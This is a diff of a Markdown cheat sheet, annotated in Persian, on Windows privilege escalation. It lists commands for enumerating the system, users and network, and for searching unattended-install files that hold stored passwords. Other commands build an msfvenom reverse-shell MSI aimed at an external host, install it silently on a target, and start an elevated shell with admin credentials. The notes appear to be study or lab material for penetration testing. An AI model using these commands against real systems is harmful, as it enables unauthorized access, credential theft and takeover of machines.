@@ -1,3 +1,27 @@
+# Enumeration ✅📚
+## Basic-Enumeration ✅
+```powershell
+systeminfo        # اطلاعات سیستم و ویندوز
+wmic os get Caption, Version, OSArchitecture
+whoami /priv      # بررسی سطح دسترسی
+net user          # لیست یوزرهای سیستم
+net localgroup administrators  # بررسی ادمین‌های محلی
+
+arp -a     # برسی جدول آرپ برای شناسایی دستگاه‌های دیگری که در شبکه فعال هستند
+ipconfig /all     # بررسی اطلاعات شبکه
+netstat -anot      # بررسی پورت‌های باز و اتصالات شبکه
+
+
+tasklist          # لیست پردازش‌های فعال
+wmic process list full  # نمایش تمام جزئیات پردازش‌ها
+Get-ChildItem -Hidden -Path C:\Users\Public\  # لیست فایل‌های مخفی
+
+```
+## Windows-Services-Enum ✅
+```cmd
+sc qc apphostsvc
+```
+
 # Password History ✅
 ## File-Unattended ✅
 ### cmd ✡️
@@ -6,7 +30,6 @@ dir C:\sysprep.inf /s /p
 dir C:\sysprep.xml /s /p
 dir C:\unattend.xml /s /p
 ```
-### powershell ✡️
 ```powershell
 Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
@@ -67,10 +90,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o
 ------------------------------
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
 ```
-## Windows-Services-Enum ✅
-```cmd
-sc qc apphostsvc
-```
+
 ## Strart-Powershell-With-Admin ✅
 ```powershell
 Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
